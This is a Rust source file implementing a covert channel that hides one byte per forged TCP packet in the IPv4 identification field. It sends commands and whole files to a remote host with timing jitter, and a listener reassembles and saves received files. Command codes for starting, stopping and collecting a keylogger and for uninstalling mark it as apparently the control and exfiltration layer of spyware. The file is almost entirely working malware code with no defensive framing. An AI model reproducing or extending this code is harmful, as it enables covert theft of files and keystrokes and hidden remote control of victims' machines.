use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Packet, checksum};
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags, TcpPacket, ipv4_checksum};
use pnet::packet::{Packet, MutablePacket};
use pnet::transport::{
    transport_channel,
    TransportChannelType::Layer3,
    TransportReceiver,
    TransportSender,
};
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::net::{IpAddr, Ipv4Addr};           // ← FIXED: added IpAddr
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

pub const CMD_EOF:            u8 = 0x41;
pub const CMD_START_TRANSFER: u8 = 0x40;
pub const CMD_START_LOGGER:   u8 = 0x10;
pub const CMD_STOP_LOGGER:    u8 = 0x20;
pub const CMD_UNINSTALL:      u8 = 0x30;
pub const CMD_REQUEST_KEYLOG: u8 = 0x50;

#[derive(Clone, Debug)]
pub struct ChannelConfig {
    pub local_ip:    Ipv4Addr,
    pub target_ip:   Ipv4Addr,
    pub send_port:   u16,
    pub listen_port: u16,
}

#[derive(Clone)]
pub struct CovertChannel {
    pub config:  Arc<ChannelConfig>,
    pub tx:      Arc<Mutex<TransportSender>>,
    pub running: Arc<AtomicBool>,
}

impl CovertChannel {
    pub fn new(
        local_ip:    Ipv4Addr,
        target_ip:   Ipv4Addr,
        send_port:   u16,
        listen_port: u16,
    ) -> (Self, TransportReceiver) {
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (tx, rx) = match transport_channel(8192, protocol) {
            Ok(pair) => pair,
            Err(e) => panic!("[!] Failed to open Layer3 channel: {}. Run as root.", e),
        };

        let config = Arc::new(ChannelConfig {
            local_ip,
            target_ip,
            send_port,
            listen_port,
        });

        (
            Self {
                config,
                tx: Arc::new(Mutex::new(tx)),
                running: Arc::new(AtomicBool::new(true)),
            },
            rx,
        )
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    pub fn send_byte(&self, byte: u8) {
        let mut buffer = [0u8; 40];
        let mut ip = MutableIpv4Packet::new(&mut buffer).unwrap();
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length(40);
        ip.set_ttl(64);
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(self.config.local_ip);
        ip.set_destination(self.config.target_ip);

        let id = ((self.config.listen_port as u16) << 8) | (byte as u16);
        ip.set_identification(id);

        let mut tcp = MutableTcpPacket::new(ip.payload_mut()).unwrap();
        tcp.set_source(self.config.listen_port);
        tcp.set_destination(self.config.send_port);
        tcp.set_sequence(0x12345678);
        tcp.set_flags(TcpFlags::ACK);
        tcp.set_window(64240);
        tcp.set_data_offset(5);

        let tcp_csum = ipv4_checksum(&tcp.to_immutable(), &self.config.local_ip, &self.config.target_ip);
        tcp.set_checksum(tcp_csum);

        let ip_csum = checksum(&ip.to_immutable());
        ip.set_checksum(ip_csum);

        if let Ok(mut tx_lock) = self.tx.lock() {
            let _ = tx_lock.send_to(ip, IpAddr::V4(self.config.target_ip));  // ← FIXED
        }
    }

    pub fn send_command(&self, cmd: &str) {
        for b in cmd.as_bytes() {
            self.send_byte(*b);
            thread::sleep(Duration::from_millis(10 + (rand::random::<u8>() % 8) as u64));
        }
        self.send_byte(b'\n');
    }

    pub fn start_transfer(&self) { self.send_byte(CMD_START_TRANSFER); }
    pub fn end_transfer(&self)   { self.send_byte(CMD_EOF); }

    pub fn send_file(&self, path: &str) -> io::Result<()> {
        let mut file = File::open(path)?;
        let size = file.metadata()?.len() as u32;

        println!("[send_file] Starting: {} ({} bytes)", path, size);

        self.start_transfer();
        thread::sleep(Duration::from_millis(40));

        for &b in &size.to_be_bytes() {
            self.send_byte(b);
            thread::sleep(Duration::from_millis(18));
        }

        const MAX_CHUNK: usize = 180;
        let mut buf = vec![0u8; MAX_CHUNK];
        let mut seq: u8 = 0;

        loop {
            let n = file.read(&mut buf)?;
            if n == 0 { break; }

            self.send_byte(seq);
            thread::sleep(Duration::from_millis(12));

            self.send_byte(n as u8);
            thread::sleep(Duration::from_millis(12));

            let csum = buf[..n].iter().fold(0u8, |acc, &x| acc.wrapping_add(x));
            self.send_byte(csum);
            thread::sleep(Duration::from_millis(12));

            for &b in &buf[..n] {
                self.send_byte(b);
                thread::sleep(Duration::from_millis(8 + (rand::random::<u8>() % 10) as u64));
            }

            seq = seq.wrapping_add(1);
        }

        self.end_transfer();
        println!("[send_file] Completed: {}", path);
        Ok(())
    }
}

pub fn start_listening(mut rx: TransportReceiver, config: Arc<ChannelConfig>, running: Arc<AtomicBool>) {
    thread::spawn(move || {
        println!("[*] Covert listener active on port {}", config.listen_port);

        let mut binary_mode = false;
        let mut file_data: Vec<u8> = Vec::new();
        let mut expected_size: Option<u32> = None;

        let mut iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while running.load(Ordering::Relaxed) {
            if let Ok((ip, _)) = iter.next() {
                if ip.get_source() != config.target_ip { continue; }

                if let Some(tcp) = TcpPacket::new(ip.payload()) {
                    if tcp.get_destination() != config.listen_port { continue; }

                    let byte = (ip.get_identification() & 0xFF) as u8;

                    if binary_mode {
                        file_data.push(byte);

                        if file_data.len() == 4 && expected_size.is_none() {
                            let size_bytes: [u8; 4] = file_data[..4].try_into().unwrap();
                            expected_size = Some(u32::from_be_bytes(size_bytes));
                            file_data.clear();
                            println!("[recv] Expected size: {} bytes", expected_size.unwrap());
                        }

                    } else {
                        match byte {
                            CMD_START_TRANSFER => {
                                binary_mode = true;
                                file_data.clear();
                                expected_size = None;
                                println!("\n[!] Receiving file transfer...");
                            }
                            CMD_EOF => {
                                if binary_mode {
                                    let received = file_data.len();
                                    println!("\n[+] Transfer finished — {} bytes", received);

                                    if let Some(exp) = expected_size {
                                        if received as u32 == exp {
                                            println!("[+] Size matches ✓");

                                            let timestamp = SystemTime::now()
                                                .duration_since(UNIX_EPOCH)
                                                .unwrap_or_default()
                                                .as_secs();

                                            let filename = format!("received_{}.bin", timestamp);
                                            let save_path = format!("./received/{}", filename);

                                            fs::create_dir_all("./received").ok();

                                            if let Err(e) = fs::write(&save_path, &file_data) {
                                                eprintln!("[!] Save failed: {}", e);
                                            } else {
                                                println!("[+] Saved to: {}", save_path);
                                            }
                                        } else {
                                            println!("[!] Size mismatch: exp {}, got {}", exp, received);
                                        }
                                    } else {
                                        println!("[!] No size prefix — saving raw");
                                        let _ = fs::write("./received/unknown.bin", &file_data);
                                    }

                                    binary_mode = false;
                                    file_data.clear();
                                    expected_size = None;
                                }
                            }
                            _ => {
                                print!("{}", byte as char);
                                let _ = io::stdout().flush();
                            }
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(5));
        }
        println!("[*] Listener stopped.");
    });
}
